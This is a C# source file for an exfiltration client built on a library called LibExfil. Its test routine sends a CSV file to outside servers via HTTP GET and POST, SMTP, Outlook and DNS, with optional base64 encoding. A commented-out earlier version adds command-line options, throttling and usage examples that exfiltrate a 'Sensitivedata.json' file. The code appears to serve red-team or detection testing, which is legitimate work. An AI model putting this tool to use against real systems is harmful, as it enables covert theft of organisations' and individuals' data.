
/*
LICENSE INFORMATION

Copyright 2020 Kaizen Cyber Ops, LLC.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

https://opensource.org/licenses/MIT
*/

using LibExfil;
using LibExfil.DataSenders;
using LibExfil.FileReaders;
using System.CodeDom;
//using LibExfil


namespace ExfilClient
{
    class ExfilClient
    {
        static void Main(string[] args)
        {
            RunTests();
        }
        static void RunTests()
        {
            string testfile = "C:\\Users\\jimmy\\SutterWork\\dev-branch\\code\\JuneProject\\DOTNET_ExfilClient\\testdata\\fakerecs.csv";
            for (int i = 0; i < 1; i++)
            {
                SupportedFileTypes ftype = SupportedFileTypes.CSV;

                SupportedSenderMethods method1 = SupportedSenderMethods.GET;
                SupportedSenderMethods method2 = SupportedSenderMethods.POST;
                SupportedSenderMethods method3 = SupportedSenderMethods.OUTLOOK;
                SupportedSenderMethods method4 = SupportedSenderMethods.SMTP;
                SupportedSenderMethods method5 = SupportedSenderMethods.DNS;

                ExfiltrationHandler h1 = new ExfiltrationHandler(method1, ftype, testfile, "http://kaizencyber.io:5000/receive.php");
                ExfiltrationHandler h2 = new ExfiltrationHandler(method2, ftype, testfile, "http://kaizencyber.io:5000/receive.php");
/*TEST THIS ONE*///ExfiltrationHandler h = new ExfiltrationHandler(method3, ftype, testfile, "http://kaizencyber.io:5000/receive.php");
                ExfiltrationHandler h3 = new ExfiltrationHandler(method4, ftype, testfile, "jreeves@kaizencyber.io",Options.SMTP_STARTTLS_HANDSHAKE);
                ExfiltrationHandler h4 = new ExfiltrationHandler(method5, ftype, testfile, "167.172.215.59");
               /* h1.SendExfilData(Options.NONE);
                h1.SendExfilData(Options.DATA_ENCODE_TO_B64);
                h2.SendExfilData(Options.NONE);
                h2.SendExfilData(Options.DATA_ENCODE_TO_B64);
                h3.SendExfilData(Options.NONE);
                h3.SendExfilData(Options.DATA_ENCODE_TO_B64);*/
                h4.SendExfilData(Options.NONE);
                h4.SendExfilData(Options.DATA_ENCODE_TO_B64);
            }
        }

    }

}


















/*
 * 
 * 
using System;
using System.Threading;
using static DataExfiltration.ExfiltrationHandler;
//ExfilClient.exe [ftype={csv|psv|json}] [method={dns|get|post}] [b64encode={true|false}] [speed={1|2|3}] [host={URL|hostname}] [filePath={path}] 
namespace DataExfiltration
{

    class ExfilClient
    {
        static SUPPORTED_FILE_TYPES ftype;
        static SUPPORTED_EXFIL_METHODS method;
        static bool b64;
        static int sleepTime;
        static String host;
        static String path;
        static int RecordsSent = 0;


        static void Main(string[] args)
        {
            if (args.Length != 6)
                FAIL();
            ProcArgs(args);

            FileUtilities fHandler = new FileUtilities(ftype, path, b64);          //FileHandler(FileType type,String fPath)
            ExfiltrationHandler exHandler = new ExfiltrationHandler(method, host);        // public ExfilHandler(Method exfilMethod,String target)


            foreach (ExfilDataFormat line_data in fHandler)
            {
                exHandler.SendExfilData(line_data);
                RecordsSent++;
                Console.WriteLine("Sent {0:D} records", RecordsSent);
                Thread.Sleep(sleepTime);
            }

            // Keep console open after finished sending data (for testing)
            Console.ReadLine();
        }


        static void FAIL()
        {
            Console.WriteLine("Usage:\n\tExfilClient.exe [ftype] [method] [b64encode] [speed] [destination] [filePath]\n");
            Console.WriteLine("\t\t[ftype={csv|psv|json}]\t\tcsv - read from csv\tpsv - read from psv\tjson - read from json");
            Console.WriteLine("\t\t[method={dns|get|post}]\t\tDNS - Use DNS A host requests\tPOST - HTTP POST\tGET - HTTP GET");
            Console.WriteLine("\t\t[b64encode={true|false}]\t\ttrue - b64 encode payload\tfalse - do not encode data");
            Console.WriteLine("\t\t[speed={1|2|3}]\t\t1 - longest sleep\t2 - medium sleep\t3 - shortest sleep");
            Console.WriteLine("\t\t[host={URL|hostname}]\t\tip address or host name");
            Console.WriteLine("\t\t[filePath={path}]\t\tfile path to read data from");
            Console.WriteLine("\nExample:");
            Console.WriteLine("\t\tExfilClient.exe ftype=json method=DNS b64encode=false speed=3 host=dns-responder.remotehost.com filepath=\"C:\\Users\\Bob\\Sensitivedata.json\"");
            Console.WriteLine("\t\tExfilClient.exe ftype=json method=POST b64encode=true speed=1 host=https://192.168.0.1:443/index.html filepath=\"C:\\Users\\Bob\\Sensitivedata.json\"");
            Console.WriteLine("\t\tExfilClient.exe ftype=json method=GET b64encode=false speed=1 host=http://192.168.0.1:8000/receivedata.php  filepath=\"C:\\Users\\Bob\\Sensitivedata.json\"");
            Console.WriteLine("\tNOTE: GET requests utilize url query parameters to pass data.\n\t\tFor example, data with format \"'name','id','date' send to http://127.0.0.1/receivedata.php will GET the following URL:\n\t\tthttp://127.0.0.1/receivedata.php?name=somename&id=27&data=april_28_2020");
            Environment.Exit(1);
        }


        static void ProcArgs(string[] args)
        {
            try
            {
                switch (args[0].ToLower())
                {
                    case "ftype=csv": ftype = SUPPORTED_FILE_TYPES.CSV; break;
                    case "ftype=psv": ftype = SUPPORTED_FILE_TYPES.PSV; break;
                    case "ftype=json": ftype = SUPPORTED_FILE_TYPES.JSON; break;
                    default: FAIL(); break;
                }
                switch (args[1].ToLower())
                {
                    case "method=dns": method = SUPPORTED_EXFIL_METHODS.DNS; break;
                    case "method=get": method = SUPPORTED_EXFIL_METHODS.GET; break;
                    case "method=post": method = SUPPORTED_EXFIL_METHODS.POST; break;
                    default: FAIL(); break;
                }
                switch (args[2].ToLower())
                {
                    case "b64encode=true": b64 = true; break;
                    case "b64encode=false": b64 = false; break;

                    default: FAIL(); break;
                }
                switch (args[3].ToLower())
                {
                    case "speed=1":
                        sleepTime = 1000;
                        break;
                    case "speed=2":
                        sleepTime = 200;
                        break;
                    case "speed=3":
                        sleepTime = 100;
                        break;
                    default: FAIL(); break;
                }
                if (args[4].ToLower().Substring(0, 5).Contains("host="))
                    host = args[4].ToLower().Substring(5).Trim('"').Trim('\'');//remove any quotations
                else
                    FAIL();

                if (args[5].ToLower().Substring(0, 9).Contains("filepath="))
                    path = args[5].ToLower().Substring(9).Trim('"').Trim('\'');//remove any quotations
                else
                    FAIL();


            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                FAIL();
            }
        }

    }

}




*/
